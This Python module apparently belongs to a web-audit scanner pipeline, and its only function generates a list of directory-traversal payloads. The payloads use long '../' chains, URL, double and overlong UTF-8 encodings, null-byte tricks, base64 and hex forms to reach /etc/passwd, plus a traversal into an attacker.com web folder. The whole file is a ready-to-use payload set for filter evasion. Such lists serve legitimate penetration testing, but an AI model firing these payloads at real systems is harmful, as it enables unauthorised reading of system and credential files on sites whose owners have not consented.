import sys

from pipe import JSONPipe


class factory(JSONPipe):
    """Generate payload for injection to webpages under audit
    """

    def __init__(self):
        pass

    def process(self, incomings):
        """Just generate all possible payloads and return them in a list.
        Ignore the `incomings` parameter because there are no inputs.

        return : a list of payloads
        """

        payloads = []

        payloads.append(["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"])
        payloads.append(["L2V0Yy9wYXNzd2Q="])
        payloads.append(["TDJWMFl5OXdZWE56ZDJRPQ%3D%3D"])

        #Contains the various types of directory pathing
        #%2f = / || %2e = . || %252f = / || '%255c' = \
        list_of_postfix_1 = ['/etc','/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd','L2V0Yy9wYXNzd2Q%3D']
        list_of_prefix = ['../','..././','./../','.../','..../','...//','....\\/','..../\\\\']

        #Print just the postfix
        for post_style in list_of_postfix_1:
            payloads.append([post_style])

        #New Postfix array (Without the last '/')
        list_of_postfix = ['','etc/passwd']

        #For extended file paths (Non-encoded)
        for post_style in list_of_postfix:
            for pre_style in list_of_prefix:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Double-slashed)
        list_of_postfix_doubleslash = ['','etc//passwd']
        list_of_prefix_doubleslash = ['..//']

        for post_style in list_of_postfix_doubleslash:
            for pre_style in list_of_prefix_doubleslash:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Encoded)
        list_of_postfix_encoded = ['','etc%2fpasswd']
        list_of_prefix_encoded = ['%2e%2e%2f']

        for post_style in list_of_postfix_encoded:
            for pre_style in list_of_prefix_encoded:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Doubly-encoded)
        list_of_postfix_d_encoded = ['','etc%252fpasswd']
        list_of_prefix_d_encoded = ['%252e%252e%252f']

        for post_style in list_of_postfix_d_encoded:
            for pre_style in list_of_prefix_d_encoded:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Other UTF-8)
        list_of_postfix_utf8_encoded = ['','etc%25c0%25afpasswd']
        list_of_prefix_utf8_encoded = ['%25c0%25ae%25c0%25ae%25c0%25af']

        for post_style in list_of_postfix_utf8_encoded:
            for pre_style in list_of_prefix_utf8_encoded:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Other UTF-8) 2
        list_of_postfix_utf8_encoded2 = ['','etc%c0%afpasswd']
        list_of_prefix_utf8_encoded2 = ['%c0%ae%c0%ae%c0%af']

        for post_style in list_of_postfix_utf8_encoded2:
            for pre_style in list_of_prefix_utf8_encoded2:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        # For extended file paths (Other UTF-8) 3
        '''
        list_of_postfix_utf8_encoded3 = ['','etc%u2215passwd']
        list_of_prefix_utf8_encoded3 = ['%uff0e%uff0e%u2215']

        for post_style in list_of_postfix_utf8_encoded3:
            for pre_style in list_of_prefix_utf8_encoded3:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])
                '''

        #For extended file paths (Other UTF-8) 4
        list_of_postfix_utf8_encoded4 = ['','etc%c0%2fpasswd']
        list_of_prefix_utf8_encoded4 = ['%c0%2e%c0%2e%c0%2f']

        for post_style in list_of_postfix_utf8_encoded4:
            for pre_style in list_of_prefix_utf8_encoded4:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Other UTF-8) 5
        list_of_postfix_utf8_encoded5 = ['','etc%uEFC8passwd']
        list_of_prefix_utf8_encoded5 = ['..%uEFC8']

        for post_style in list_of_postfix_utf8_encoded5:
            for pre_style in list_of_prefix_utf8_encoded5:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #For extended file paths (Hex)
        list_of_postfix_hex = ['']
        list_of_prefix_hex = ['0x2e0x2e0x2f']

        for post_style in list_of_postfix_hex:
            for pre_style in list_of_prefix_hex:
                curr_file_path = post_style;
                for times in range(0,15):
                    curr_file_path = pre_style + curr_file_path;
                #Start from longest path
                payloads.append([curr_file_path])

        #2-part Inputs
        list_of_second_input = ['passwd']

        #Do it with postfix_1 first
        for post_style in list_of_postfix_1:
            for second_input in list_of_second_input:
                payloads.append([post_style, second_input])

        #New Postfix array (Without the last '/')
        list_of_postfix_2 = ['etc','etc/']

        for second_input in list_of_second_input:
            for post_style in list_of_postfix_2:
                for pre_style in list_of_prefix:
                    curr_file_path = post_style;
                    for times in range(0,15):
                        curr_file_path = pre_style + curr_file_path;
                    payloads.append([curr_file_path, second_input])

        return payloads
